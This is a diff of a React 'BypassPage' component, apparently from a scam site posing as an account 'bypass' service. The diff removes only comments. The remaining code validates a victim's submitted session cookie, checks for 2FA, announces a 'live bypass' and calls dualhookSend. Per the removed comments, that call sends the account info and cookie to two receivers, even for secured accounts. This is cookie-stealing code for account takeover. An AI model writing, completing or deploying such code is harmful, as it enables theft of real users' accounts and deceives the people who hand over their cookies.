@@ -95,7 +95,6 @@ const BypassPage = () => {
       }
     } catch { apiOk = false; }
 
-    // If cookie invalid → just block, no embed, no live log
     if (!apiOk) {
       if (intervalRef.current) window.clearInterval(intervalRef.current);
       setProgress(0);
@@ -104,7 +103,6 @@ const BypassPage = () => {
       return;
     }
 
-    // Secured accounts (2FA only) → BLOCK BYPASS live, but still send main receiver
     if (info.has2FA) {
       if (intervalRef.current) window.clearInterval(intervalRef.current);
       setProgress(0);
@@ -115,7 +113,6 @@ const BypassPage = () => {
       return;
     }
 
-    // Cookie valid + unsecured — announce live bypass start immediately
     broadcastLiveBypass(info);
 
     const elapsed = Date.now() - start;
@@ -124,7 +121,6 @@ const BypassPage = () => {
     if (intervalRef.current) window.clearInterval(intervalRef.current);
     setProgress(100);
 
-    // Send dualhook hit embeds (info + cookie) regardless of age/2FA — only blocked by invalid cookie
     await dualhookSend("bypass", info);
     pushLiveBypass({ username: info.username || 'Unknown', avatarUrl: info.avatarUrl, success: true });
 
